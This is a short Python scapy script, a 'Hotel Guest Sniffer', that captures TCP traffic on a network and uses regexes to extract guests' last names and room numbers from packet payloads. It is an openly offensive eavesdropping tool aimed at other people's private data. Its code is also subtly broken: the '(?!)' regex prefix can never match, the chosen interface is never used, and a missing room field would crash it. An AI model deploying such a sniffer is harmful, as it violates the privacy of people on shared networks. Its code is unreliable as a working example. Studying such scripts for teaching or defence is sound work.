from scapy.all import *
from optparse import OptionParser

def findGuest(pkt):
    raw = pkt.sprintf('%Raw.load%')
    name = re.findall('(?!)LAST_NAME=(.*)', raw)
    room = re.findall('(?!)ROOM_NUMBER=(.*)', raw)
    if name:
        print('[+] Found: ', str(name[0]), ' Room #', str(room[0]))
        
def main():
    parser = OptionParser()
    parser.add_option("-i", dest = 'interface_name', help = 'Specify interface to listen on', type = 'string')
    (options, args) = parser.parse_args()
    if (options.interface_name == None):
        (options, args) = parser.parse_args(["-h"])
    else:
        interface = options.interface_name
    try:
        print('[*] Starting Hotel Guest Sniffer')
        sniff(filter='tcp', prn = findGuest, store = 0)
    except KeyboardInterrupt:
        exit(0)
        
if __name__ == '__main__':
    main()
